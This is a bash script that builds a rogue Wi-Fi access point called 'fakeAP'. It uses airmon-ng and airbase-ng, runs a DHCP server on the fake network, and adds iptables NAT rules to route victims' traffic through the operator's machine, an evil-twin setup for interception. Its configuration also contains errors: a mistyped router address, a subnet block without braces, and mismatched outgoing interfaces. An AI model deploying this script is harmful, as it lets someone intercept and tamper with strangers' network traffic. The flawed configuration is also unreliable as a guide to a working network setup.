#!/bin/bash

echo '[*] Setting IP Forwarding'
echo 1 > /proc/sys/net/ipv4/ip_forward

echo '[*] Setting DHCPD configuration'
echo 'ddns-update-style ad-hoc;' > /etc/dhcp3/dhcpd.conf
echo 'default-lease-time 600;' >> /etc/dhcp3/dhcpd.conf
echo 'max-lease-time 7200;' >> /etc/dhcp3/dhcpd.conf
echo 'subnet 192.168.2.128 netmask 255.255.255.128;' >> /etc/dhcp3/dhcpd.conf
echo 'option subnet-mask 255.255.255.128;' >> /etc/dhcp3/dhcpd.conf
echo 'option broadcast-address 192.168.2.255;' >> /etc/dhcp3/dhcpd.conf
echo 'option routers 192.169.2.255;' >> /etc/dhcp3/dhcpd.conf
echo 'option domain-name-servers 8.8.8.8;' >> /etc/dhcp3/dhcpd.conf
echo 'range 192.168.2.130 192.168.2.140;' >> /etc/dhcp3/dhcpd.conf


echo '[*] starting monitor mode on wlan0'
airmon-ng start wlan0

echo '[*] starting fake ap'
airbase-ng -e 'fakeAP' -c 9 mon0 &

echo '[*] setting at0 interface'

ifconfig at0 up
ifconfig at0 192.168.2.129 netmask 255.255.255.128
route add -net 192.168.2.128 netmask 255.255.255.128 gw 192.168.2.129

echo '[*] Running dhcp server'

mkdir -p  /var/run/dhcpd && chown dhcpd:dhcpd /var/run/dhcpd
dhcpd3 -cf /etc/dhcp3/dhcpd.conf -pf /var/run/dhcpd/dhcpd.pid at0

echo '[*] Setting up iptables rules'

iptables -t nat -A POSTROUTING --out-interface wlan0 -j MASQUERADE
iptables -A FORWARD --in-interface at0 --out-interface eth0 -j ACCEPT

echo '[*] Try connecting'
